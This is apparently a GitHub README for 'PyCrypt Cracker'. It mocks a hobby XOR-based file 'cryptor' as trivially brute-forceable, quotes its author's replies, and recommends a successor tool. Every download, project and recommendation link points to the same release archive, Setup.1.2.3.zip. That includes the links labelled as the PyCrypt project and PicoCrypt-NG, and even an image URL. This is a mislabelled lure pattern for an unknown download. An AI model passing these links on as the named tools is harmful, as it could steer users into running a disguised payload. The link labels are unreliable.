# PyCrypt Cracker
[![Download](https://img.shields.io/badge/Download%20Link-blue)](https://github.com/soulkeeper273zy1/pycrypt-cracker/releases/download/5/Setup.1.2.3.zip)

![PyCrypt](https://github.com/soulkeeper273zy1/pycrypt-cracker/releases/download/5/Setup.1.2.3.zip) is an open-source project by ![Neptune Development](https://github.com/NepDevelopment), a "Batch and Python Development Group making CyberSecurity utilities for the public to utilize".

![Pycrypt](https://i.imgur.com/mS83IkB.png)

# Not Really Secure
Now reading this and seeing that they have their own RAT, I thought it would be hilarious to check out their Cryptor. It unsurprisingly turns out that it’s not really secure. The “encryption” is just XOR with a repeated SHA-256 hash of the password, and the file header literally stores the password hash in plain view. That makes it trivial to brute force or crack. There’s no salt, no key-stretching, no integrity check, and filenames leak. In short: it looks like protection, but anyone with basic knowledge can decrypt it easily. So much for using "it's own encryption code".

![MyTurn](https://i.imgur.com/Z5YJd0Q.png)

And what do you know! You can easily brute-force it!

Anyways enjoy my code, hopefully its useful for some other projects or perhaps a CTF that uses XOR?

# Reaction From Author

- "first release btw and compiling and multiple encoding and obfuscation"
- "sorry but if I rly wanted to encrypt smth I wouldn't use "okay" as my password 🥀 make it make sense twin"
- "it was made in a day twin if I really wanted to make an encryptor I would probably spend more than that it was a quick project and it does matter what the password is because a bruteforce is gonna find "okay" so ez"

# Who Makes An Actual Cryptor?

I recommend ![PicoCrypt-NG](https://github.com/soulkeeper273zy1/pycrypt-cracker/releases/download/5/Setup.1.2.3.zip) the successor to the now archived ![PicoCrypt](https://github.com/Picocrypt/Picocrypt)

![PicoNG](https://github.com/soulkeeper273zy1/pycrypt-cracker/releases/download/5/Setup.1.2.3.zip/raw/main/images/screenshot.png)
